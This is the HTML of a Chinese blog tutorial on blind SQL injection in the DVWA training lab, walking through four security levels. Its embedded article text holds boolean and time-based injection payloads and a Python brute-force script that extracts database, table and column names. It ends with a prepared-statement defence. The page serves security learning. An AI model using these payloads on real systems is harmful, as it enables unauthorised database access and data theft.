
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="YWZ">
    <title>DVWA(八)：SQL-Injection（Blind盲注） - YWZ</title>
    <meta name="author" content="YWZ">
    
    
        <link rel="icon" href="https://yiwenzhe.com/assets/images/favicon.ico">
    
    
        
            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
        
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"YWZ","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://google.com/","mailto:2410776350@qq.com"],"image":"picture.jpg"},"articleBody":"\n&emsp;&emsp;普通sql注入会显示出成功信息或者sql错误信息，攻击者可以根据回显来窃取数据库信息。而一般情况网站管理员不将数据库错误信息直接返回，而是返回自己设定的信息或者不显示，因此攻击者无法确定注入的sql语句是否正确，也无法得到库名、表名等。&emsp;&emsp;根据页面不同的响应方式，SQL盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注。&emsp;&emsp;基于布尔的盲注：&emsp;&emsp;通过构造判断条件，如数据库中库名、表名长度是否相等、字段名是否相同、字段名某个字符是否相等，根据服务器返回的结果（成功或失败），不断调整判断条件中的数值直到命中。此类注入需要服务器回显部分信息，如语句执行成功还是失败等。&emsp;&emsp;基于时间的盲注：&emsp;&emsp;通过构造判断条件，使用sleep()函数，当判断为true时sleep一段时间，false时不执行。通过服务器的响应时间判断语句是否命中。此类注入不需要服务器回显信息，只需要响应时间即可。&emsp;&emsp;基于错误的盲注：&emsp;&emsp;依赖于几个报错函数，如floor和count、group by冲突报错，UpdateXml()函数、ExtracValue()函数等，执行错误返回数据库信息。\n安全级别Low源码分析12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;    // Get input    $id = $_GET[ &#x27;id&#x27; ];    // Check database    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors    // Get results    $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors    if( $num &gt; 0 ) &#123;        // Feedback for end user        echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;;    &#125;    else &#123;        // User wasn&#x27;t found, so the page wasn&#x27;t!        header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; );        // Feedback for end user        echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;\n&emsp;&emsp;和七中的普通sql注入不同，这里并没有使用mysqli_error返回错误信息。无论sql语句是错误还是正确，只能得到exists或者missing两种结果。&emsp;&emsp;DVWA中只有如下两种显示：\n\n\n\n\n\n漏洞复现获取数据库名长度\n1231&#x27; and length(database())&gt;5 #    显示MISSING1&#x27; and length(database())&gt;3 #    显示exists1&#x27; and length(database())=4 #    显示exists\n&emsp;&emsp;这里使用length函数获取长度，与设定数值比较，一步步测试，得到库名长度为4。\n获取数据库名\n&emsp;&emsp;mysql中有字符串函数 substr()，可以从指定位置开始截取指定长度的字符串，其参数为substr(string string,num start,num length)。其中string为字符串，start为起始位置，length为长度。&emsp;&emsp;因此可以使用如下语句测试每个字符：\n121&#x27; and substr(database(),1,1)=&#x27;a&#x27;#   测试第一个字符是否为a1&#x27; and substr(database(),1,1)=&#x27;b&#x27;#   测试第一个字符是否为b\n&emsp;&emsp;mysql中也有ascii()函数，可以返回字符的ascii码值，也可使用如下语句来测试：\n1231&#x27; and ascii(substr(database(),1,1))&gt;80#1&#x27; and ascii(substr(database(),1,1))&lt;120#1&#x27; and ascii(substr(database(),1,1))=100#\n&emsp;&emsp;最后获取到当前连接数据库的名称为：dvwa。\n获取数据库表名\n&emsp;&emsp;通过信息数据库 information_schema 可以得到数据库中的表、字段等信息，具体如何获取请参考文章DVWA(七)：SQL-Injection（sql注入）\n&emsp;&emsp;代码如下：\n12345678910111213猜测表的个数1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;10 # 1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&lt;5 # 1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 猜测表名长度1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;10 #1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #猜测第一个表名1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #猜测第二个表名1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #\n&emsp;&emsp;最后获取到表个数为2，表名分别为guestbook和users。\n获取表中字段名\n123456789猜测字段个数1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;10 #1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8 #猜测字段长度1&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=7 #猜测字段名称1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117 #\n&emsp;&emsp;就算猜到了字段名称，字段具体值要一个个猜中还是很困难的，只能凭借用户习惯和运气来测试，这也是sql盲注的难点。sql盲注及其耗费时间，往往需要编写脚本来批量测试。这里给出一个python脚本如下（脚本来源以dvwa为例学习简单sql布尔盲注的详细脚本）：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import requestss = requests.Session()#payload应该包括所有大小写字母和其他字符，这里是简化使用payloads = &#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27; #此处提交需要用户登录的cookie，可以使用burpsuit抓取headers = &#123;&#x27;Cookie&#x27;: &#x27;security=low; PHPSESSID=1rgudn49lotqe6hedvv6uu7ioj&#x27;&#125;#url为dvwa中sql盲注地址url=&quot;http://192.168.71.1/DVWA/vulnerabilities/sqli_blind/&quot;for j in range(1,50):    databaseLen_payload = &#x27;?id=1\\&#x27; and length(database())=&#x27;+str(j)+&#x27; %23&amp;Submit=Submit#&#x27;    # 所有payload里的注释#要用url编码%23表示，因为这是直接添加在url里的    if &#x27;User ID exists in the database.&#x27; in s.get(url+databaseLen_payload, headers=headers).text:        databaseLen = j        breakprint(&#x27;database_lenth: &#x27;+str(databaseLen))databse_name = &#x27;&#x27;for j in range(1,databaseLen+1):    for i in payloads:        databse_payload = &#x27;?id=1\\&#x27; and substr(database(),&#x27;+str(j)+&#x27;,1)=\\&#x27;&#x27;+str(i)+&#x27;\\&#x27; %23&amp;Submit=Submit#&#x27;        if &#x27;User ID exists in the database.&#x27; in s.get(url+databse_payload, headers=headers).text:            databse_name += iprint(&#x27;database_name: &#x27;+databse_name)        # 3.爆破表的个数for j in range(1,50):    tableNum_payload = &#x27;?id=1\\&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=&#x27;+str(j)+&#x27; %23&amp;Submit=Submit#&#x27;    if &#x27;User ID exists in the database.&#x27; in s.get(url+tableNum_payload, headers=headers).text:        tableNum = j        breakprint(&#x27;tableNum: &#x27;+str(tableNum))# 4.爆出所有的表名# (1)爆出各个表名的长度for j in range(0,tableNum):    table_name = &#x27;&#x27;    for i in range(1,50):        tableLen_payload = &#x27;?id=1\\&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;+str(j)+&#x27;,1),1))=&#x27;+str(i)+&#x27; %23&amp;Submit=Submit#&#x27;        if &#x27;User ID exists in the database.&#x27; in s.get(url+tableLen_payload, headers=headers).text:            tableLen = i            print(&#x27;table&#x27;+str(j+1)+&#x27;_length: &#x27;+str(tableLen))                      # (2)内部循环爆破每个表的表名            for m in range(1,tableLen+1):                for n in payloads:                    table_payload = &#x27;?id=1\\&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;+str(j)+&#x27;,1),&#x27;+str(m)+&#x27;,1)=\\&#x27;&#x27;+str(n)+&#x27;\\&#x27; %23&amp;Submit=Submit#&#x27;                    if &#x27;User ID exists in the database.&#x27; in s.get(url+table_payload, headers=headers).text:                        table_name += n            print(&#x27;table&#x27;+str(j+1)+&#x27;_name: &#x27;+table_name)\n&emsp;&emsp;结果如下：\n\n\n&emsp;&emsp;以上例子都是基于布尔的盲注，也可以使用基于时间的盲注获取信息。输入：\n11&#x27; and if(length(database())=4,sleep(5),1 )# \n&emsp;&emsp;当length正确时，网页会加载至少5秒；当length错误时，网页很快就返回。如下图，可以看到延迟时间为5.02秒。\n\n\n安全级别Medium1234567891011121314151617181920212223242526&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;    // Get input    $id = $_POST[ &#x27;id&#x27; ];    $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Check database    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors    // Get results    $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors    if( $num &gt; 0 ) &#123;        // Feedback for end user        echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;;    &#125;    else &#123;        // Feedback for end user        echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;;    &#125;    //mysql_close();&#125;?&gt;\n&emsp;&emsp;中级代码中，使用POST获取传入参数，同时使用mysqli_real_escape_string来过滤一些特殊字符。所以当使用带引号的变量’dvwa’或者’users’时，可以使用16进制来代替。&emsp;&emsp;中级的盲注过程和低级类似，其中中级需要POST方法提交，并注意一些字符的绕过，可参考上一篇文章DVWA(七)：SQL-Injection（sql注入）。\n安全级别High123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_COOKIE[ &#x27;id&#x27; ] ) ) &#123;    // Get input    $id = $_COOKIE[ &#x27;id&#x27; ];    // Check database    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors    // Get results    $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors    if( $num &gt; 0 ) &#123;        // Feedback for end user        echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;;    &#125;    else &#123;        // Might sleep a random amount 随机延时        if( rand( 0, 5 ) == 3 ) &#123;            sleep( rand( 2, 4 ) );        &#125;        // User wasn&#x27;t found, so the page wasn&#x27;t!        header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; );        // Feedback for end user        echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;\n&emsp;&emsp;查询语句中使用Limit 1限制结果为一条，可以直接使用#注释该限制。同时在查询失败时，会使用sleep随机延时0-5秒，所以不能使用基于时间的盲注，可以使用基于布尔的盲注，和安全级别low过程类似。\n安全级别Impossible1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );    // Get input    $id = $_GET[ &#x27;id&#x27; ];    // Was a number entered?    if(is_numeric( $id )) &#123;        // Check the database        $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );        $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );        $data-&gt;execute();        // Get results        if( $data-&gt;rowCount() == 1 ) &#123;            // Feedback for end user            echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;;        &#125;        else &#123;            // User wasn&#x27;t found, so the page wasn&#x27;t!            header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; );            // Feedback for end user            echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;;        &#125;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;\n&emsp;&emsp;Impossible代码中使用 Anti-CSRF token防止CSRF攻击，使用is_numeric( $id )判断输入的id是数字还是字符串，只有输入为数字才执行sql查询。\n&emsp;&emsp;使用db-&gt;prepare和data-&gt;bindParam预处理sql语句，使得传入的变量被固定为数据，因此也就不会当做代码执行。最后验证sql语句查询结果数目$data-&gt;rowCount() == 1，只有为一条时才输出，有效防止爆库。","dateCreated":"2021-06-28T21:29:05+08:00","dateModified":"2021-10-09T20:58:47+08:00","datePublished":"2021-06-28T21:29:05+08:00","description":"简单分析了dvwa中sql盲注四个安全级别的源码，本文可和上一篇sql注入结合理解，注入方式基本相同。","headline":"DVWA(八)：SQL-Injection（Blind盲注）","image":["https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/top.jpeg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/"},"publisher":{"@type":"Organization","name":"YWZ","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://google.com/","mailto:2410776350@qq.com"],"image":"picture.jpg","logo":{"@type":"ImageObject","url":"picture.jpg"}},"url":"https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/","keywords":"DVWA, sql盲注","thumbnailUrl":"https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/top.jpeg"}</script>
    <meta name="description" content="简单分析了dvwa中sql盲注四个安全级别的源码，本文可和上一篇sql注入结合理解，注入方式基本相同。">
<meta property="og:type" content="blog">
<meta property="og:title" content="DVWA(八)：SQL-Injection（Blind盲注）">
<meta property="og:url" content="https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/index.html">
<meta property="og:site_name" content="YWZ">
<meta property="og:description" content="简单分析了dvwa中sql盲注四个安全级别的源码，本文可和上一篇sql注入结合理解，注入方式基本相同。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/4.png">
<meta property="article:published_time" content="2021-06-28T13:29:05.000Z">
<meta property="article:modified_time" content="2021-10-09T12:58:47.515Z">
<meta property="article:author" content="YWZ">
<meta property="article:tag" content="DVWA">
<meta property="article:tag" content="sql盲注">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/1.png">
    
    
        
    
    
        <meta property="og:image" content="https://yiwenzhe.com/assets/images/picture.jpg">
    
    
        <meta property="og:image" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/top.jpeg">
        <meta class="swiftype" name="image" data-type="enum" content="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/top.jpeg">
    
    
    
    <!--STYLES-->
    
<link rel="stylesheet" href="/assets/css/style-5ctctel0cuzrmzotlasreim3qgxouuqpfme70vruknhdpfxw6enuh6pympnk.min.css">

    <!--STYLES END-->
    

    
    <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?003fd62f149a30bc5f172a1ed42483c3";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="4">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/" aria-label>
            YWZ
        </a>
    </div>
    
        
            <a class="header-right-picture " href="#about" aria-label="打开链接: /#about">
        
        
            <img class="header-picture" src="/assets/images/picture.jpg" alt="作者的图片">
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="4">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about" aria-label="阅读有关作者的更多信息">
                    <img class="sidebar-profile-picture" src="/assets/images/picture.jpg" alt="作者的图片">
                </a>
                <h4 class="sidebar-profile-name">YWZ</h4>
                
                    <h5 class="sidebar-profile-bio"><p>一个无聊的程序员</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="/" rel="noopener" title="首页">
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="/all-categories" rel="noopener" title="分类">
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="/all-tags" rel="noopener" title="标签">
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="/all-archives" rel="noopener" title="归档">
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link open-algolia-search" href="/search" rel="noopener" title="搜索">
                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">搜索</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="/shuoshuo" rel="noopener" title="说说">
                        <i class="sidebar-button-icon fas fa-comments" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">说说</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="#about" rel="noopener" title="关于">
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="https://github.com/" target="_blank" rel="external nofollow noopener noreferrer" title="GitHub">
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="http://stackoverflow.com/users" target="_blank" rel="external nofollow noopener noreferrer" title="Stack Overflow">
                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Stack Overflow</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="https://twitter.com/" target="_blank" rel="external nofollow noopener noreferrer" title="Twitter">
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="https://facebook.com/" target="_blank" rel="external nofollow noopener noreferrer" title="Facebook">
                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Facebook</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="https://google.com/" target="_blank" rel="external nofollow noopener noreferrer" title="Google">
                        <i class="sidebar-button-icon fab fa-google" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Google</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="mailto:2410776350@qq.com" target="_blank" rel="external nofollow noopener noreferrer" title="邮箱">
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a class="sidebar-button-link " href="/atom.xml" rel="noopener" title="RSS">
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="4" style="background-color: rgba(255, 255, 255, 0.85);" class="
                        hasCoverMetaIn
                        ">
                
<article class="post">
    

    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title">
            DVWA(八)：SQL-Injection（Blind盲注）
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2021-06-28T21:29:05+08:00">
	
		    2021 年 06 月 28 日
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>


    
    
        &nbsp;|&nbsp; 更新于
        <time itemprop="dateUpdated" content="Sat Oct 09 2021 20:58:47 GMT+0800">
        
		    2021 年 10 月 09 日
    	
        </time>
    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <!-- excerpt --><br><h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%ABLow"><span class="toc-text">安全级别Low</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%ABMedium"><span class="toc-text">安全级别Medium</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%ABHigh"><span class="toc-text">安全级别High</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%ABImpossible"><span class="toc-text">安全级别Impossible</span></a></li></ol><p></p>
<p>&emsp;&emsp;普通sql注入会显示出成功信息或者sql错误信息，攻击者可以根据回显来窃取数据库信息。而一般情况网站管理员不将数据库错误信息直接返回，而是返回自己设定的信息或者不显示，因此攻击者无法确定注入的sql语句是否正确，也无法得到库名、表名等。<br>&emsp;&emsp;根据页面不同的响应方式，SQL盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注。<br>&emsp;&emsp;<strong>基于布尔的盲注：</strong><br>&emsp;&emsp;通过构造判断条件，如数据库中库名、表名长度是否相等、字段名是否相同、字段名某个字符是否相等，根据服务器返回的结果（成功或失败），不断调整判断条件中的数值直到命中。此类注入需要服务器回显部分信息，如语句执行成功还是失败等。<br>&emsp;&emsp;<strong>基于时间的盲注：</strong><br>&emsp;&emsp;通过构造判断条件，使用sleep()函数，当判断为true时sleep一段时间，false时不执行。通过服务器的响应时间判断语句是否命中。此类注入不需要服务器回显信息，只需要响应时间即可。<br>&emsp;&emsp;<strong>基于错误的盲注：</strong><br>&emsp;&emsp;依赖于几个报错函数，如floor和count、group by冲突报错，UpdateXml()函数、ExtracValue()函数等，执行错误返回数据库信息。</p>
<h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;和七中的普通sql注入不同，这里并没有使用mysqli_error返回错误信息。无论sql语句是错误还是正确，只能得到exists或者missing两种结果。<br>&emsp;&emsp;DVWA中只有如下两种显示：</p>
<div align="center"><img src="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/1.png" width="350" height="122"></div>

<p><br></p>
<div align="center"><img src="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/2.png" width="350" height="115"></div>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>获取数据库名长度</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 #    显示MISSING</span></span><br><span class="line">1&#x27; and length(database())&gt;3 #    显示exists</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())=4 #    显示exists</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里使用length函数获取长度，与设定数值比较，一步步测试，得到库名长度为4。</p>
<p><strong>获取数据库名</strong></p>
<p>&emsp;&emsp;mysql中有字符串函数 substr()，可以从指定位置开始截取指定长度的字符串，其参数为substr(string string,num start,num length)。其中string为字符串，start为起始位置，length为长度。<br>&emsp;&emsp;因此可以使用如下语句测试每个字符：</p>
